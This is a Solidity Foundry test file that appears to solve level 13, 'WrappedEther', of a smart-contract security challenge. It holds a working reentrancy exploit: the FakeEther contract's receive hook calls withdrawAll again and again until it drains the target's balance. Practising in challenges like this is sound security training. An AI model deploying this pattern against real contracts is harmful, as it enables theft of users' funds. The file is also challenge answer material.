// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";


contract FakeEther {
    function manOfSteel(WrappedEther instance) payable external {
        instance.deposit{value:msg.value}(address(this));
        instance.withdrawAll();
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            WrappedEther(msg.sender).withdrawAll();
        }
    }
}

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        vm.startPrank(owner);
        vm.deal(owner, 0.09 ether);
        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(owner);
        vm.stopPrank();
    }

    function testExploitLevel() public {
        FakeEther feelItSteel = new FakeEther();

        feelItSteel.manOfSteel{value: 0.09 ether}(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
